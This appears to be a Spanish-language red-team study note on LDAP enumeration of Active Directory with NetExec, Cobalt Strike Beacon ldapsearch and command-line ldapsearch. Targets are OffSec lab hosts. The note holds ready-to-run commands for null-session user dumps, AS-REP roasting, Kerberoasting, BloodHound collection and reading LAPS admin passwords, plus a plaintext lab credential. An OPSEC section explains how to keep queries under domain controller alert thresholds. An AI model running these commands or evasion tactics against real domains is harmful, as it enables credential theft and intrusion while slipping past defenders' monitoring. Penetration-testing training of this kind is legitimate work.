---
title: LDAP — Consultas Avanzadas con Cobalt Strike + OPSEC
tags: [ldap, cobalt-strike, active-directory, recon, opsec, bloodhound]
---

# LDAP Avanzado — Beacon ldapsearch

## NXC — Enumeración rápida via LDAP

```bash
# Usuarios (null session)
nxc ldap 192.168.237.122 -u '' -p '' --users

# AS-REP Roastable
nxc ldap <IP> -u '' -p '' --asreproast sw-asrep.txt

# Kerberoastable
nxc ldap <IP> -u '' -p '' --kerberoasting sw-kerb.txt

# Extraer datos para BloodHound
nxc ldap 192.168.237.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' --bloodhound -c All -d hutch.offsec --dns-server 192.168.237.122

# Leer contraseña LAPS (Local Admin Password Solution)
nxc ldap 192.168.237.122 -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --module laps
```

> [!tip] Guía completa de nxc + LDAP: https://medium.com/@tareshsharma17/the-ultimate-guide-to-active-directory-ldap-enumeration-using-netexec-af7f24ec05ff

---

## Beacon `ldapsearch` — Filtros

Buscar por campo indexado es **mucho más rápido** y menos ruidoso que por campo no indexado.

### Filtros básicos

```
# Todas las cuentas de usuario (samAccountType=805306368 = SAM_NORMAL_USER_ACCOUNT)
beacon> ldapsearch (samAccountType=805306368)

# Operadores lógicos: & (AND), | (OR), ! (NOT)
# Admins (samAccountType=usuario Y adminCount=1)
beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1))

# Admins cuya descripción contenga "admin" O cuyo nombre contenga "adm"
beacon> ldapsearch (&(samAccountType=805306368)(|(description=*admin*)(samaccountname=*adm*)))

# Admins excluyendo krbtgt
beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)(!(name=krbtgt)))
```

> [!important] Los atributos siempre van al inicio de la query grupal.

### Controlar atributos devueltos

```
beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof

# ntsecuritydescriptor — NECESARIO para BloodHound
beacon> ldapsearch (&(samAccountType=805306368)(adminCount=1)) --attributes name,memberof,ntsecuritydescriptor
```

---

## Filtros Bitwise — OIDs de AD

| OID | Operación |
|-----|-----------|
| `1.2.840.113556.1.4.803` | BIT_AND (bit a bit AND) |
| `1.2.840.113556.1.4.804` | BIT_OR (bit a bit OR) |
| `1.2.840.113556.1.4.1941` | IN_CHAIN (grupos anidados) |

```
# Ordenadores con Unconstrained Delegation (userAccountControl bit 524288)
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

# Grupos anidados — quién es miembro de Domain Admins (recursivo)
beacon> ldapsearch "(memberof:1.2.840.113556.1.4.1941:=CN=Domain Admins,CN=Users,DC=contoso,DC=com)" --attributes samaccountname
```

---

## OPSEC — Los 3 Umbrales del DC

Los Blue Teams monitorean el comportamiento del DC con umbrales configurables.

### 1. Expensive Search Results
Consultas que devuelven **demasiados resultados** (por encima del límite configurado).

❌ `(objectClass=*)` — devuelve absolutamente todo

### 2. Search Time
Consultas que tardan **más de N milisegundos** en procesar.

❌ Pedir muchos atributos o usar `*` ralentiza enormemente la query.

✅ Pedir solo los atributos necesarios:
```
beacon> ldapsearch (samAccountType=805306368) --attributes samaccounttype,distinguishedname,objectsid,ntsecuritydescriptor
```

### 3. Inefficient Search Results ⚠️ El más contraintuitivo

Activa cuando el DC **visita muchos objetos** pero devuelve **menos del 10%**.

El problema del Kerberoasting:
```
# ESTA QUERY DISPARA LA ALERTA aunque parece específica:
beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))
```
El DC tiene que visitar TODOS los usuarios para comprobar si tienen SPN. Como muy pocos los tienen, la ratio de eficiencia cae < 10% → alerta.

### Estrategia correcta

A veces hacer una enumeración general es **más silenciosa** que filtrar mucho:

```
# Extraer todos los usuarios con atributos mínimos — eficiente para el DC
beacon> ldapsearch "(samAccountType=805306368)" --attributes samaccounttype,distinguishedname,objectsid,serviceprincipalname,useraccountcontrol,ntsecuritydescriptor
```

Después filtrar localmente en los resultados, no en la query LDAP.

---

## ldapsearch (línea de comandos)

```bash
# Enumeración básica
ldapsearch -x -H ldap://hutch.offsec -b "dc=hutch,dc=offsec" "(objectClass=person)"

# Con credenciales — buscar LAPS passwords
ldapsearch -v -x -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 \
  -b "DC=hutch,DC=offsec" -h 192.168.120.108 \
  "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

## Ver también
- [[05-ad-attacks/discovery/ldap-discovery|LDAP Discovery]]
- [[05-ad-attacks/discovery/bofhound|BOFHound]]
- [[05-ad-attacks/discovery/enumeración-ad|Enumeración AD]]
- [[05-ad-attacks/kerberos/kerberoasting|Kerberoasting]]
